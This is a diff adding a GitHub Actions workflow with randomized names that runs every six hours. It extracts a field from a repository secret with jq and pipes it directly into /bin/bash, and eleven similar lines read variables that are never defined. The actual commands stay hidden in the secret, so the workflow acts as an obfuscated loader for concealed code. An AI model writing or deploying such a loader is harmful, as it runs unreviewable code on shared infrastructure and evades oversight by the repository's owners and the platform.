@@ -1,0 +1,29 @@
+name: xianshuangxiju
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianshuangxiju
+        env:
+          jzil73211: ${{ secrets.jzil73211 }}
+        run: |
+          echo $jzil73211 | jq -r .e235 | /bin/bash
+          echo $bqqsp2099 | jq -r .cr036 | /bin/bash
+          echo $xd24411 | jq -r .g30380 | /bin/bash
+          echo $lqoe6 | jq -r .qv16 | /bin/bash
+          echo $odtt9243 | jq -r .c55861 | /bin/bash
+          echo $fflny51965 | jq -r .a71215 | /bin/bash
+          echo $fy66612 | jq -r .erivy6321 | /bin/bash
+          echo $c346 | jq -r .wwvqk2081 | /bin/bash
+          echo $qg4987 | jq -r .b34057 | /bin/bash
+          echo $dupzb9 | jq -r .xpgc8 | /bin/bash
+          echo $kgcat22189 | jq -r .ws6 | /bin/bash
+          echo $wlldn1 | jq -r .heo50 | /bin/bash
+
